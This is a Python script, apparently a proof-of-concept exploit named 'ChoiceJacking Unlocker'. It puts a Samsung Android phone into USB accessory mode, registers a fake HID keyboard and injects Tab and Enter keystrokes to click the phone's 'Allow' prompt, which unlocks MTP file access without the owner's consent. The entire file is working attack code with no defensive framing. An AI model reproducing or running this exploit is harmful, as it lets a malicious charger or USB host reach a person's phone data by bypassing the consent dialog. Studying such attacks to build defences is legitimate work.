
import usb.core
import usb.util
import time
import struct

# USB HID Keyboard constants
REPORT_DESCRIPTOR = b"".join([
    b"\x05\x01",        # Usage Page (Generic Desktop)
    b"\x09\x06",        # Usage (Keyboard)
    b"\xa1\x01",        # Collection (Application)
    b"\x05\x07",        #   Usage Page (Key Codes)
    b"\x19\xe0",        #   Usage Minimum (224)
    b"\x29\xe7",        #   Usage Maximum (231)
    b"\x15\x00",        #   Logical Minimum (0)
    b"\x25\x01",        #   Logical Maximum (1)
    b"\x75\x01",        #   Report Size (1)
    b"\x95\x08",        #   Report Count (8)
    b"\x81\x02",        #   Input (Data, Variable, Absolute); Modifier byte
    b"\x95\x01",        #   Report Count (1)
    b"\x75\x08",        #   Report Size (8)
    b"\x81\x01",        #   Input (Constant); Reserved byte
    b"\x95\x05",        #   Report Count (5)
    b"\x75\x01",        #   Report Size (1)
    b"\x05\x08",        #   Usage Page (LEDs)
    b"\x19\x01",        #   Usage Minimum (1)
    b"\x29\x05",        #   Usage Maximum (5)
    b"\x91\x02",        #   Output (Data, Variable, Absolute); LED report
    b"\x95\x01",        #   Report Count (1)
    b"\x75\x03",        #   Report Size (3)
    b"\x91\x01",        #   Output (Constant); LED report padding
    b"\x95\x06",        #   Report Count (6)
    b"\x75\x08",        #   Report Size (8)
    b"\x15\x00",        #   Logical Minimum (0)
    b"\x25\x65",        #   Logical Maximum (101)
    b"\x05\x07",        #   Usage Page (Key Codes)
    b"\x19\x00",        #   Usage Minimum (0)
    b"\x29\x65",        #   Usage Maximum (101)
    b"\x81\x00",        #   Input (Data, Array); Key codes (6 bytes)
    b"\xc0"            # End Collection
])

def send_key(dev, keycode):
    # HID Report: [Modifiers] [Reserved] [Key1] [Key2] [Key3] [Key4] [Key5] [Key6]
    # Key down
    report = struct.pack("BBBBBBBB", 0, 0, keycode, 0, 0, 0, 0, 0)
    dev.ctrl_transfer(0x40, 56, 1, 0, report) # ACCESSORY_SEND_HID_EVENT (ID=1)
    time.sleep(0.05)
    # Key up
    report = struct.pack("BBBBBBBB", 0, 0, 0, 0, 0, 0, 0, 0)
    dev.ctrl_transfer(0x40, 56, 1, 0, report)
    time.sleep(0.05)

def unlock(vid=0x04e8, pid=0x6860):
    print(f"[*] Starting ChoiceJacking Unlocker (Target: 0x{vid:04x}:0x{pid:04x})")
    dev = usb.core.find(idVendor=vid, idProduct=pid)
    if not dev:
        print("[-] Device not found.")
        return

    try:
        # 1. AOA Transition
        print("[*] Sending AOA Identifying Strings...")
        # Get Protocol
        dev.ctrl_transfer(0xC0, 51, 0, 0, 2)
        # Send Strings
        dev.ctrl_transfer(0x40, 52, 0, 0, b"SuperSploit\0")
        dev.ctrl_transfer(0x40, 52, 0, 1, b"HID_Unlocker\0")
        dev.ctrl_transfer(0x40, 52, 0, 2, b"1.0\0")
        # Start Accessory
        dev.ctrl_transfer(0x40, 53, 0, 0, 0)
        
        print("[*] Waiting for AOA re-enumeration...")
        time.sleep(3)
        
        # Re-find the device (it will have a different VID/PID)
        dev = usb.core.find(idVendor=0x18d1, idProduct=0x2d00)
        if not dev:
            dev = usb.core.find(idVendor=0x18d1, idProduct=0x2d01)
        
        if not dev:
            print("[-] Could not find device in Accessory Mode.")
            return

        print(f"[+] Device found in Accessory Mode: VID=0x{dev.idVendor:04x} PID=0x{dev.idProduct:04x}")

        # 2. Register HID
        print("[*] Registering HID Keyboard via AOAP...")
        # ACCESSORY_REGISTER_HID (ID=1, len=desc_len)
        dev.ctrl_transfer(0x40, 54, 1, len(REPORT_DESCRIPTOR))
        
        # 2. Send Descriptor
        print("[*] Sending Report Descriptor...")
        # ACCESSORY_SET_HID_REPORT_DESC (ID=1, offset=0)
        dev.ctrl_transfer(0x40, 55, 1, 0, REPORT_DESCRIPTOR)
        
        # 3. Trigger AOA Transition (if needed) to ensure HID is active
        # Some Samsung devices allow HID even in MTP mode.
        
        print("[*] Injecting 'Tab' -> 'Enter' sequence to click 'Allow'...")
        # Tab = 0x2b, Enter = 0x28
        send_key(dev, 0x2b) # Tab
        time.sleep(0.2)
        send_key(dev, 0x28) # Enter
        
        print("[+] HID Injection complete. Check if MTP is now unlocked.")
        
    except Exception as e:
        print(f"[-] Error during HID injection: {e}")

if __name__ == "__main__":
    unlock()
